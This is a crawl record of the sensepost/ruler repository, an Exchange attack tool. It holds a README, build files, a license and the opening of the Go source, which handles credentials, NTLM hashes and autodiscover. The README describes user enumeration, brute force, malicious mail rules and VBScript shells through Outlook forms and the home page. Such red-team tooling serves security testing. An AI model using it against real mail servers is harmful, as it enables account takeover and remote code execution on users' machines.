{
  "metadata": {
    "timestamp": 1736567359174,
    "page": 966,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjk3MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "sensepost/ruler",
      "stars": 2185,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.30078125,
          "content": "# Compiled Object files, Static and Dynamic libs (Shared Objects)\n*.o\n*.a\n*.so\n\n# Folders\n_obj\n_test\n\n# Architecture specific extensions/prefixes\n*.[568vq]\n[568vq].out\n\n*.cgo1.go\n*.cgo2.c\n_cgo_defun.c\n_cgo_gotypes.go\n_cgo_export.*\n\n_testmain.go\n\n*.exe\n*.test\n*.prof\n\nruler-*\nruler\nlogs/\n\nbuild.sh\nconfig.yml\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 16.3046875,
          "content": "Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International\nPublic License\n\nBy exercising the Licensed Rights (defined below), You accept and agree\nto be bound by the terms and conditions of this Creative Commons\nAttribution-NonCommercial-ShareAlike 4.0 International Public License\n(\"Public License\"). To the extent this Public License may be\ninterpreted as a contract, You are granted the Licensed Rights in\nconsideration of Your acceptance of these terms and conditions, and the\nLicensor grants You such rights in consideration of benefits the\nLicensor receives from making the Licensed Material available under\nthese terms and conditions.\n\n\nSection 1 -- Definitions.\n\n  a. Adapted Material means material subject to Copyright and Similar\n     Rights that is derived from or based upon the Licensed Material\n     and in which the Licensed Material is translated, altered,\n     arranged, transformed, or otherwise modified in a manner requiring\n     permission under the Copyright and Similar Rights held by the\n     Licensor. For purposes of this Public License, where the Licensed\n     Material is a musical work, performance, or sound recording,\n     Adapted Material is always produced where the Licensed Material is\n     synched in timed relation with a moving image.\n\n  b. Adapter's License means the license You apply to Your Copyright\n     and Similar Rights in Your contributions to Adapted Material in\n     accordance with the terms and conditions of this Public License.\n\n  c. BY-NC-SA Compatible License means a license listed at\n     creativecommons.org/compatiblelicenses, approved by Creative\n     Commons as essentially the equivalent of this Public License.\n\n  d. Copyright and Similar Rights means copyright and/or similar rights\n     closely related to copyright including, without limitation,\n     performance, broadcast, sound recording, and Sui Generis Database\n     Rights, without regard to how the rights are labeled or\n     categorized. For purposes of this Public License, the rights\n     specified in Section 2(b)(1)-(2) are not Copyright and Similar\n     Rights.\n\n  e. Effective Technological Measures means those measures that, in the\n     absence of proper authority, may not be circumvented under laws\n     fulfilling obligations under Article 11 of the WIPO Copyright\n     Treaty adopted on December 20, 1996, and/or similar international\n     agreements.\n\n  f. Exceptions and Limitations means fair use, fair dealing, and/or\n     any other exception or limitation to Copyright and Similar Rights\n     that applies to Your use of the Licensed Material.\n\n  g. License Elements means the license attributes listed in the name\n     of a Creative Commons Public License. The License Elements of this\n     Public License are Attribution, NonCommercial, and ShareAlike.\n\n  h. Licensed Material means the artistic or literary work, database,\n     or other material to which the Licensor applied this Public\n     License.\n\n  i. Licensed Rights means the rights granted to You subject to the\n     terms and conditions of this Public License, which are limited to\n     all Copyright and Similar Rights that apply to Your use of the\n     Licensed Material and that the Licensor has authority to license.\n\n  j. Licensor means the individual(s) or entity(ies) granting rights\n     under this Public License.\n\n  k. NonCommercial means not primarily intended for or directed towards\n     commercial advantage or monetary compensation. For purposes of\n     this Public License, the exchange of the Licensed Material for\n     other material subject to Copyright and Similar Rights by digital\n     file-sharing or similar means is NonCommercial provided there is\n     no payment of monetary compensation in connection with the\n     exchange.\n\n  l. Share means to provide material to the public by any means or\n     process that requires permission under the Licensed Rights, such\n     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  m. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n     the Council of 11 March 1996 on the legal protection of databases,\n     as amended and/or succeeded, as well as other essentially\n     equivalent rights anywhere in the world.\n\n  n. You means the individual or entity exercising the Licensed Rights\n     under this Public License. Your has a corresponding meaning.\n\n\nSection 2 -- Scope.\n\n  a. License grant.\n\n       1. Subject to the terms and conditions of this Public License,\n          the Licensor hereby grants You a worldwide, royalty-free,\n          non-sublicensable, non-exclusive, irrevocable license to\n          exercise the Licensed Rights in the Licensed Material to:\n\n            a. reproduce and Share the Licensed Material, in whole or\n               in part, for NonCommercial purposes only; and\n\n            b. produce, reproduce, and Share Adapted Material for\n               NonCommercial purposes only.\n\n       2. Exceptions and Limitations. For the avoidance of doubt, where\n          Exceptions and Limitations apply to Your use, this Public\n          License does not apply, and You do not need to comply with\n          its terms and conditions.\n\n       3. Term. The term of this Public License is specified in Section\n          6(a).\n\n       4. Media and formats; technical modifications allowed. The\n          Licensor authorizes You to exercise the Licensed Rights in\n          all media and formats whether now known or hereafter created,\n          and to make technical modifications necessary to do so. The\n          Licensor waives and/or agrees not to assert any right or\n          authority to forbid You from making technical modifications\n          necessary to exercise the Licensed Rights, including\n          technical modifications necessary to circumvent Effective\n          Technological Measures. For purposes of this Public License,\n          simply making modifications authorized by this Section 2(a)\n          (4) never produces Adapted Material.\n\n       5. Downstream recipients.\n\n            a. Offer from the Licensor -- Licensed Material. Every\n               recipient of the Licensed Material automatically\n               receives an offer from the Licensor to exercise the\n               Licensed Rights under the terms and conditions of this\n               Public License.\n\n            b. Additional offer from the Licensor -- Adapted Material.\n               Every recipient of Adapted Material from You\n               automatically receives an offer from the Licensor to\n               exercise the Licensed Rights in the Adapted Material\n               under the conditions of the Adapter's License You apply.\n\n            c. No downstream restrictions. You may not offer or impose\n               any additional or different terms or conditions on, or\n               apply any Effective Technological Measures to, the\n               Licensed Material if doing so restricts exercise of the\n               Licensed Rights by any recipient of the Licensed\n               Material.\n\n       6. No endorsement. Nothing in this Public License constitutes or\n          may be construed as permission to assert or imply that You\n          are, or that Your use of the Licensed Material is, connected\n          with, or sponsored, endorsed, or granted official status by,\n          the Licensor or others designated to receive attribution as\n          provided in Section 3(a)(1)(A)(i).\n\n  b. Other rights.\n\n       1. Moral rights, such as the right of integrity, are not\n          licensed under this Public License, nor are publicity,\n          privacy, and/or other similar personality rights; however, to\n          the extent possible, the Licensor waives and/or agrees not to\n          assert any such rights held by the Licensor to the limited\n          extent necessary to allow You to exercise the Licensed\n          Rights, but not otherwise.\n\n       2. Patent and trademark rights are not licensed under this\n          Public License.\n\n       3. To the extent possible, the Licensor waives any right to\n          collect royalties from You for the exercise of the Licensed\n          Rights, whether directly or through a collecting society\n          under any voluntary or waivable statutory or compulsory\n          licensing scheme. In all other cases the Licensor expressly\n          reserves any right to collect such royalties, including when\n          the Licensed Material is used other than for NonCommercial\n          purposes.\n\n\nSection 3 -- License Conditions.\n\nYour exercise of the Licensed Rights is expressly made subject to the\nfollowing conditions.\n\n  a. Attribution.\n\n       1. If You Share the Licensed Material (including in modified\n          form), You must:\n\n            a. retain the following if it is supplied by the Licensor\n               with the Licensed Material:\n\n                 i. identification of the creator(s) of the Licensed\n                    Material and any others designated to receive\n                    attribution, in any reasonable manner requested by\n                    the Licensor (including by pseudonym if\n                    designated);\n\n                ii. a copyright notice;\n\n               iii. a notice that refers to this Public License;\n\n                iv. a notice that refers to the disclaimer of\n                    warranties;\n\n                 v. a URI or hyperlink to the Licensed Material to the\n                    extent reasonably practicable;\n\n            b. indicate if You modified the Licensed Material and\n               retain an indication of any previous modifications; and\n\n            c. indicate the Licensed Material is licensed under this\n               Public License, and include the text of, or the URI or\n               hyperlink to, this Public License.\n\n       2. You may satisfy the conditions in Section 3(a)(1) in any\n          reasonable manner based on the medium, means, and context in\n          which You Share the Licensed Material. For example, it may be\n          reasonable to satisfy the conditions by providing a URI or\n          hyperlink to a resource that includes the required\n          information.\n       3. If requested by the Licensor, You must remove any of the\n          information required by Section 3(a)(1)(A) to the extent\n          reasonably practicable.\n\n  b. ShareAlike.\n\n     In addition to the conditions in Section 3(a), if You Share\n     Adapted Material You produce, the following conditions also apply.\n\n       1. The Adapter's License You apply must be a Creative Commons\n          license with the same License Elements, this version or\n          later, or a BY-NC-SA Compatible License.\n\n       2. You must include the text of, or the URI or hyperlink to, the\n          Adapter's License You apply. You may satisfy this condition\n          in any reasonable manner based on the medium, means, and\n          context in which You Share Adapted Material.\n\n       3. You may not offer or impose any additional or different terms\n          or conditions on, or apply any Effective Technological\n          Measures to, Adapted Material that restrict exercise of the\n          rights granted under the Adapter's License You apply.\n\n\nSection 4 -- Sui Generis Database Rights.\n\nWhere the Licensed Rights include Sui Generis Database Rights that\napply to Your use of the Licensed Material:\n\n  a. for the avoidance of doubt, Section 2(a)(1) grants You the right\n     to extract, reuse, reproduce, and Share all or a substantial\n     portion of the contents of the database for NonCommercial purposes\n     only;\n\n  b. if You include all or a substantial portion of the database\n     contents in a database in which You have Sui Generis Database\n     Rights, then the database in which You have Sui Generis Database\n     Rights (but not its individual contents) is Adapted Material,\n     including for purposes of Section 3(b); and\n\n  c. You must comply with the conditions in Section 3(a) if You Share\n     all or a substantial portion of the contents of the database.\n\nFor the avoidance of doubt, this Section 4 supplements and does not\nreplace Your obligations under this Public License where the Licensed\nRights include other Copyright and Similar Rights.\n\n\nSection 5 -- Disclaimer of Warranties and Limitation of Liability.\n\n  a. UNLESS OTHERWISE SEPARATELY UNDERTAKEN BY THE LICENSOR, TO THE\n     EXTENT POSSIBLE, THE LICENSOR OFFERS THE LICENSED MATERIAL AS-IS\n     AND AS-AVAILABLE, AND MAKES NO REPRESENTATIONS OR WARRANTIES OF\n     ANY KIND CONCERNING THE LICENSED MATERIAL, WHETHER EXPRESS,\n     IMPLIED, STATUTORY, OR OTHER. THIS INCLUDES, WITHOUT LIMITATION,\n     WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR\n     PURPOSE, NON-INFRINGEMENT, ABSENCE OF LATENT OR OTHER DEFECTS,\n     ACCURACY, OR THE PRESENCE OR ABSENCE OF ERRORS, WHETHER OR NOT\n     KNOWN OR DISCOVERABLE. WHERE DISCLAIMERS OF WARRANTIES ARE NOT\n     ALLOWED IN FULL OR IN PART, THIS DISCLAIMER MAY NOT APPLY TO YOU.\n\n  b. TO THE EXTENT POSSIBLE, IN NO EVENT WILL THE LICENSOR BE LIABLE\n     TO YOU ON ANY LEGAL THEORY (INCLUDING, WITHOUT LIMITATION,\n     NEGLIGENCE) OR OTHERWISE FOR ANY DIRECT, SPECIAL, INDIRECT,\n     INCIDENTAL, CONSEQUENTIAL, PUNITIVE, EXEMPLARY, OR OTHER LOSSES,\n     COSTS, EXPENSES, OR DAMAGES ARISING OUT OF THIS PUBLIC LICENSE OR\n     USE OF THE LICENSED MATERIAL, EVEN IF THE LICENSOR HAS BEEN\n     ADVISED OF THE POSSIBILITY OF SUCH LOSSES, COSTS, EXPENSES, OR\n     DAMAGES. WHERE A LIMITATION OF LIABILITY IS NOT ALLOWED IN FULL OR\n     IN PART, THIS LIMITATION MAY NOT APPLY TO YOU.\n\n  c. The disclaimer of warranties and limitation of liability provided\n     above shall be interpreted in a manner that, to the extent\n     possible, most closely approximates an absolute disclaimer and\n     waiver of all liability.\n\n\nSection 6 -- Term and Termination.\n\n  a. This Public License applies for the term of the Copyright and\n     Similar Rights licensed here. However, if You fail to comply with\n     this Public License, then Your rights under this Public License\n     terminate automatically.\n\n  b. Where Your right to use the Licensed Material has terminated under\n     Section 6(a), it reinstates:\n\n       1. automatically as of the date the violation is cured, provided\n          it is cured within 30 days of Your discovery of the\n          violation; or\n\n       2. upon express reinstatement by the Licensor.\n\n     For the avoidance of doubt, this Section 6(b) does not affect any\n     right the Licensor may have to seek remedies for Your violations\n     of this Public License.\n\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n     License.\n\n\nSection 7 -- Other Terms and Conditions.\n\n  a. The Licensor shall not be bound by any additional or different\n     terms or conditions communicated by You unless expressly agreed.\n\n  b. Any arrangements, understandings, or agreements regarding the\n     Licensed Material not stated herein are separate from and\n     independent of the terms and conditions of this Public License.\n\n\nSection 8 -- Interpretation.\n\n  a. For the avoidance of doubt, this Public License does not, and\n     shall not be interpreted to, reduce, limit, restrict, or impose\n     conditions on any use of the Licensed Material that could lawfully\n     be made without permission under this Public License.\n\n  b. To the extent possible, if any provision of this Public License is\n     deemed unenforceable, it shall be automatically reformed to the\n     minimum extent necessary to make it enforceable. If the provision\n     cannot be reformed, it shall be severed from this Public License\n     without affecting the enforceability of the remaining terms and\n     conditions.\n\n  c. No term or condition of this Public License will be waived and no\n     failure to comply consented to unless expressly agreed to by the\n     Licensor.\n\n  d. Nothing in this Public License constitutes or may be interpreted\n     as a limitation upon, or waiver of, any privileges and immunities\n     that apply to the Licensor or You, including from the legal\n     processes of any jurisdiction or authority.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 0.818359375,
          "content": "build:\n\tgo build -o ruler ruler.go\n\nrun:\n\tgo run ruler.go\n\ncompile:\n\t# 32-bit\n\t# Linux\n\tGOOS=linux GOARCH=386 go build -o ruler-linux86\n\tsha256sum  ruler-linux86\n\t# Windows\n\tGOOS=windows GOARCH=386 go build -o ruler-win86.exe\n\tsha256sum  ruler-win86.exe\n\n\t# 64-bit\n\t# Linux\n\tGOOS=linux GOARCH=amd64 go build -o ruler-linux64\n\tsha256sum  ruler-linux64\n\t# Windows\n\tGOOS=windows GOARCH=amd64 go build -o ruler-win64.exe\n\tsha256sum  ruler-win64.exe\n \t# OSX\n\tGOOS=darwin GOARCH=amd64 go build -o ruler-osx64\n\tsha256sum  ruler-osx64\n\n\t# ARM 64-bit\n\t# 64-bit\n\t# Linux\n\tGOOS=linux GOARCH=arm64 go build -o ruler-linux-arm64\n\tsha256sum  ruler-linux-arm64\n\t# Windows\n\tGOOS=windows GOARCH=arm64 go build -o ruler-win-arm64.exe\n\tsha256sum  ruler-win-arm64.exe\n \t# OSX\n\tGOOS=darwin GOARCH=arm64 go build -o ruler-osx-arm64\n\tsha256sum  ruler-osx-arm64\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.1376953125,
          "content": "# Introduction\n\nRuler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.\n\nThe full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog posts:\n* [Ruler release]\n* [Pass the Hash with Ruler]\n* [Outlook forms and shells]\n* [Outlook Home Page – Another Ruler Vector]\n\nFor a demo of it in action: [Ruler on YouTube]\n\n## What does it do?\n\nRuler has multiple functions and more are planned. These include\n\n* Enumerate valid users\n* Create new malicious mail rules\n* Dump the Global Address List (GAL)\n* VBScript execution through forms\n* VBScript execution through the Outlook Home Page\n\nRuler attempts to be semi-smart when it comes to interacting with Exchange and uses the Autodiscover service (just as your Outlook client would) to discover the relevant information.\n\n# Getting Started\n\nCompiled binaries for Linux, OSX and Windows are available. Find these in [Releases]\ninformation about setting up Ruler from source is found in the [getting-started guide].\n\n# Usage\n\nRuler has multiple functions, these have their own documentation that can be found in the [wiki]:\n\n* [BruteForce] -- discover valid user accounts\n* [Rules] -- perform the traditional, rule based attack\n* [Forms] -- execute VBScript through forms\n* [Homepage] -- use the Outlook 'home page' for shell and persistence\n* [GAL] -- grab the Global Address List\n\n# Attacking Exchange\n\nThe library included with Ruler allows for the creation of custom message using MAPI. This along with the Exchange documentation is a great starting point for new research. For an example of using this library in another project, see [SensePost Liniaal].\n\n# License\n[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](http://creativecommons.org/licenses/by-nc-sa/4.0/)\n\nRuler is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0/) Permissions beyond the scope of this license may be available at http://sensepost.com/contact/.\n\n\n[Ruler Release]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>\n[Pass the hash with Ruler]: <https://sensepost.com/blog/2017/pass-the-hash-with-ruler/>\n[Outlook forms and shells]: <https://sensepost.com/blog/2017/outlook-forms-and-shells/>\n[Outlook Home Page – Another Ruler Vector]: <https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/>\n[Ruler on YouTube]:<https://www.youtube.com/watch?v=C07GS4M8BZk>\n[Releases]: <https://github.com/sensepost/ruler/releases>\n[SensePost Liniaal]:<https://github.com/sensepost/liniaal>\n[wiki]:<https://github.com/sensepost/ruler/wiki>\n[BruteForce]:<https://github.com/sensepost/ruler/wiki/Brute-Force>\n[Rules]:<https://github.com/sensepost/ruler/wiki/Rules>\n[Forms]:<https://github.com/sensepost/ruler/wiki/Forms>\n[Homepage]:<https://github.com/sensepost/ruler/wiki/Homepage>\n[GAL]:<https://github.com/sensepost/ruler/wiki/GAL>\n[getting-started guide]:<https://github.com/sensepost/ruler/wiki/Getting-Started>\n"
        },
        {
          "name": "autodiscover",
          "type": "tree",
          "content": null
        },
        {
          "name": "forms",
          "type": "tree",
          "content": null
        },
        {
          "name": "go.mod",
          "type": "blob",
          "size": 0.5576171875,
          "content": "module github.com/sensepost/ruler\n\ngo 1.21\n\nrequire (\n\tgithub.com/howeyc/gopass v0.0.0-20210920133722-c8aef6fb66ef\n\tgithub.com/staaldraad/go-ntlm v0.0.0-20200612175713-cd032d41aa8c\n\tgithub.com/urfave/cli v1.22.15\n\tgolang.org/x/net v0.26.0\n\tgopkg.in/yaml.v2 v2.4.0\n)\n\nrequire (\n\tgithub.com/cpuguy83/go-md2man/v2 v2.0.4 // indirect\n\tgithub.com/russross/blackfriday/v2 v2.1.0 // indirect\n\tgolang.org/x/crypto v0.24.0 // indirect\n\tgolang.org/x/sys v0.21.0 // indirect\n\tgolang.org/x/term v0.21.0 // indirect\n\tgopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c // indirect\n)\n"
        },
        {
          "name": "go.sum",
          "type": "blob",
          "size": 3.953125,
          "content": "github.com/BurntSushi/toml v1.3.2/go.mod h1:CxXYINrC8qIiEnFrOxCa7Jy5BFHlXnUU2pbicEuybxQ=\ngithub.com/cpuguy83/go-md2man/v2 v2.0.4 h1:wfIWP927BUkWJb2NmU/kNDYIBTh/ziUX91+lVfRxZq4=\ngithub.com/cpuguy83/go-md2man/v2 v2.0.4/go.mod h1:tgQtvFlXSQOSOSIRvRPT7W67SCa46tRHOmNcaadrF8o=\ngithub.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38=\ngithub.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3+rkHYY13jYWTU97c=\ngithub.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38=\ngithub.com/howeyc/gopass v0.0.0-20210920133722-c8aef6fb66ef h1:A9HsByNhogrvm9cWb28sjiS3i7tcKCkflWFEkHfuAgM=\ngithub.com/howeyc/gopass v0.0.0-20210920133722-c8aef6fb66ef/go.mod h1:lADxMC39cJJqL93Duh1xhAs4I2Zs8mKS89XWXFGp9cs=\ngithub.com/kr/pretty v0.2.1 h1:Fmg33tUaq4/8ym9TJN1x7sLJnHVwhP33CNkpYV/7rwI=\ngithub.com/kr/pretty v0.2.1/go.mod h1:ipq/a2n7PKx3OHsz4KJII5eveXtPO4qwEXGdVfWzfnI=\ngithub.com/kr/pty v1.1.1/go.mod h1:pFQYn66WHrOpPYNljwOMqo10TkYh1fy3cYio2l3bCsQ=\ngithub.com/kr/text v0.1.0 h1:45sCR5RtlFHMR4UwH9sdQ5TC8v0qDQCHnXt+kaKSTVE=\ngithub.com/kr/text v0.1.0/go.mod h1:4Jbv+DJW3UT/LiOwJeYQe1efqtUx/iVham/4vfdArNI=\ngithub.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=\ngithub.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=\ngithub.com/russross/blackfriday/v2 v2.1.0 h1:JIOH55/0cWyOuilr9/qlrm0BSXldqnqwMsf35Ld67mk=\ngithub.com/russross/blackfriday/v2 v2.1.0/go.mod h1:+Rmxgy9KzJVeS9/2gXHxylqXiyQDYRxCVz55jmeOWTM=\ngithub.com/staaldraad/go-ntlm v0.0.0-20200612175713-cd032d41aa8c h1:ZGPsFTrrYiQUmVV+86h6HX9ml4PyrA1REy8NWQwrcBE=\ngithub.com/staaldraad/go-ntlm v0.0.0-20200612175713-cd032d41aa8c/go.mod h1:Jzdz9vcdmcS8ZT5Q+UYGSx8PSIKaQtxQvNVUqN/MOMQ=\ngithub.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF+rwdDfMAkV7OtwuqBVzrE8GR6GFx+wExME=\ngithub.com/stretchr/objx v0.4.0/go.mod h1:YvHI0jy2hoMjB+UWwv71VJQ9isScKT/TqJzVSSt89Yw=\ngithub.com/stretchr/objx v0.5.0/go.mod h1:Yh+to48EsGEfYuaHDzXPcE3xhTkx73EhmCGUpEOglKo=\ngithub.com/stretchr/objx v0.5.2/go.mod h1:FRsXN1f5AsAjCGJKqEizvkpNtU+EGNCLh3NxZ/8L+MA=\ngithub.com/stretchr/testify v1.7.1/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=\ngithub.com/stretchr/testify v1.8.0/go.mod h1:yNjHg4UonilssWZ8iaSj1OCr/vHnekPRkoO+kdMU+MU=\ngithub.com/stretchr/testify v1.8.4/go.mod h1:sz/lmYIOXD/1dqDmKjjqLyZ2RngseejIcXlSw2iwfAo=\ngithub.com/stretchr/testify v1.9.0 h1:HtqpIVDClZ4nwg75+f6Lvsy/wHu+3BoSGCbBAcpTsTg=\ngithub.com/stretchr/testify v1.9.0/go.mod h1:r2ic/lqez/lEtzL7wO/rwa5dbSLXVDPFyf8C91i36aY=\ngithub.com/urfave/cli v1.22.15 h1:nuqt+pdC/KqswQKhETJjo7pvn/k4xMUxgW6liI7XpnM=\ngithub.com/urfave/cli v1.22.15/go.mod h1:wSan1hmo5zeyLGBjRJbzRTNk8gwoYa2B9n4q9dmRIc0=\ngolang.org/x/crypto v0.24.0 h1:mnl8DM0o513X8fdIkmyFE/5hTYxbwYOjDS/+rK6qpRI=\ngolang.org/x/crypto v0.24.0/go.mod h1:Z1PMYSOR5nyMcyAVAIQSKCDwalqy85Aqn1x3Ws4L5DM=\ngolang.org/x/net v0.26.0 h1:soB7SVo0PWrY4vPW/+ay0jKDNScG2X9wFeYlXIvJsOQ=\ngolang.org/x/net v0.26.0/go.mod h1:5YKkiSynbBIh3p6iOc/vibscux0x38BZDkn8sCUPxHE=\ngolang.org/x/sys v0.21.0 h1:rF+pYz3DAGSQAxAu1CbC7catZg4ebC4UIeIhKxBZvws=\ngolang.org/x/sys v0.21.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\ngolang.org/x/term v0.21.0 h1:WVXCp+/EBEHOj53Rvu+7KiT/iElMrO8ACK16SMZ3jaA=\ngolang.org/x/term v0.21.0/go.mod h1:ooXLefLobQVslOqselCNF4SxFAaoS6KujMbsGzSDmX0=\ngopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=\ngopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c h1:Hei/4ADfdWqJk1ZMxUNpqntNwaWcugrBjAiHlqqRiVk=\ngopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c/go.mod h1:JHkPIbrfpd72SG/EVd6muEfDQjcINNoR0C8j2r3qZ4Q=\ngopkg.in/yaml.v2 v2.4.0 h1:D8xgwECY7CYvx+Y2n4sBz93Jn9JRvxdiyyo8CTfuKaY=\ngopkg.in/yaml.v2 v2.4.0/go.mod h1:RDklbk79AGWmwhnvt/jBztapEOGDOx6ZbXqjP6csGnQ=\ngopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c/go.mod h1:K4uyk7z7BCEPqu6E+C64Yfv1cQ7kz7rIZviUmN+EgEM=\ngopkg.in/yaml.v3 v3.0.1 h1:fxVm/GzAzEWqLHuvctI91KS9hhNmmWOoWu0XTYJS7CA=\ngopkg.in/yaml.v3 v3.0.1/go.mod h1:K4uyk7z7BCEPqu6E+C64Yfv1cQ7kz7rIZviUmN+EgEM=\n"
        },
        {
          "name": "http-ntlm",
          "type": "tree",
          "content": null
        },
        {
          "name": "mapi",
          "type": "tree",
          "content": null
        },
        {
          "name": "rpc-http",
          "type": "tree",
          "content": null
        },
        {
          "name": "ruler.go",
          "type": "blob",
          "size": 50.6484375,
          "content": "package main\n\nimport (\n\t\"bufio\"\n\t\"encoding/hex\"\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n\t\"net/http/cookiejar\"\n\t\"net/url\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/howeyc/gopass\"\n\t\"github.com/sensepost/ruler/autodiscover\"\n\t\"github.com/sensepost/ruler/forms\"\n\t\"github.com/sensepost/ruler/mapi\"\n\t\"github.com/sensepost/ruler/utils\"\n\t\"github.com/urfave/cli\"\n)\n\n// globals\nvar config utils.Session\n\nfunc exit(err error) {\n\t//we had an error\n\tif err != nil {\n\t\tutils.Error.Println(err)\n\t}\n\n\t//let's disconnect from the MAPI session\n\texitcode, err := mapi.Disconnect()\n\tif err != nil {\n\t\tutils.Error.Println(err)\n\t}\n\tos.Exit(exitcode)\n}\n\n// function to perform an autodiscover\nfunc discover(c *cli.Context) error {\n\tif c.GlobalString(\"domain\") == \"\" {\n\t\treturn fmt.Errorf(\"Required param --domain is missing\")\n\t}\n\n\tif c.Bool(\"dump\") == true && (c.GlobalString(\"username\") == \"\" && c.GlobalString(\"email\") == \"\") {\n\t\treturn fmt.Errorf(\"--dump requires credentials to be set\")\n\t}\n\n\tif c.Bool(\"dump\") == false && (c.GlobalString(\"username\") != \"\" || c.GlobalString(\"email\") != \"\") {\n\t\treturn fmt.Errorf(\"Credentials supplied, but no --dump. No credentials required for URL discovery. Dumping requires credentials to be set\")\n\t}\n\n\tif c.Bool(\"dump\") == true && c.String(\"out\") == \"\" {\n\t\treturn fmt.Errorf(\"--dump requires an out file to be set with --out /path/to/file.txt\")\n\t}\n\n\tvar err error\n\tif c.Bool(\"dump\") == true && c.GlobalString(\"password\") == \"\" && c.GlobalString(\"hash\") == \"\" {\n\t\tfmt.Printf(\"Password: \")\n\t\tvar pass []byte\n\t\tpass, err = gopass.GetPasswd()\n\t\tif err != nil {\n\t\t\t// Handle gopass.ErrInterrupted or getch() read error\n\t\t\treturn fmt.Errorf(\"Password or hash required. Supply NTLM hash with --hash\")\n\t\t}\n\t\tconfig.Pass = string(pass)\n\t} else {\n\t\tconfig.Pass = c.GlobalString(\"password\")\n\t\tif config.NTHash, err = hex.DecodeString(c.GlobalString(\"hash\")); err != nil {\n\t\t\treturn fmt.Errorf(\"Invalid hash provided. Hex decode failed\")\n\t\t}\n\t}\n\n\t//setup our autodiscover service\n\tconfig.Domain = c.GlobalString(\"domain\")\n\tif c.GlobalString(\"username\") == \"\" {\n\t\tconfig.User = \"nosuchuser\"\n\t} else {\n\t\tconfig.User = c.GlobalString(\"username\")\n\t}\n\tif c.GlobalString(\"email\") == \"\" {\n\t\tconfig.Email = \"nosuchemail\"\n\t} else {\n\t\tconfig.Email = c.GlobalString(\"email\")\n\t}\n\tconfig.Basic = c.GlobalBool(\"basic\")\n\tconfig.Insecure = c.GlobalBool(\"insecure\")\n\tconfig.Verbose = c.GlobalBool(\"verbose\")\n\tconfig.Admin = c.GlobalBool(\"admin\")\n\tconfig.RPCEncrypt = !c.GlobalBool(\"noencrypt\")\n\tconfig.CookieJar, _ = cookiejar.New(nil)\n\tconfig.Proxy = c.GlobalString(\"proxy\")\n\tconfig.UserAgent = c.GlobalString(\"useragent\")\n\n\tconfig.Hostname = c.GlobalString(\"hostname\")\n\tif config.Hostname == \"\" {\n\t\thostname, err := os.Hostname()\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"An error is occurred while getting Hostname value. Try to specify it manually using --hostname\")\n\t\t}\n\t\tconfig.Hostname = hostname\n\t}\n\n\turl := c.GlobalString(\"url\")\n\tif url == \"\" {\n\t\turl = config.Domain\n\t}\n\n\tautodiscover.SessionConfig = &config\n\n\t//var resp *utils.AutodiscoverResp\n\tvar domain string\n\tif c.Bool(\"mapi\") == true {\n\t\t_, domain, err = autodiscover.MAPIDiscover(url)\n\t} else {\n\t\t_, domain, err = autodiscover.Autodiscover(url)\n\t}\n\n\tif domain == \"\" && err != nil {\n\t\treturn err\n\t}\n\n\tif c.Bool(\"dump\") == true {\n\t\tpath := c.String(\"out\")\n\t\tutils.Info.Printf(\"Looks like the autodiscover service was found, Writing to: %s \\n\", path)\n\t\tfout, _ := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0666)\n\t\t_, err := fout.WriteString(domain)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"Couldn't write to file for some reason... %s\", err)\n\t\t}\n\t} else {\n\t\tutils.Info.Printf(\"Looks like the autodiscover service is at: %s \\n\", domain)\n\t\tutils.Info.Println(\"Checking if domain is hosted on Office 365\")\n\t\t//smart check to see if domain is on office365\n\t\t//A request to 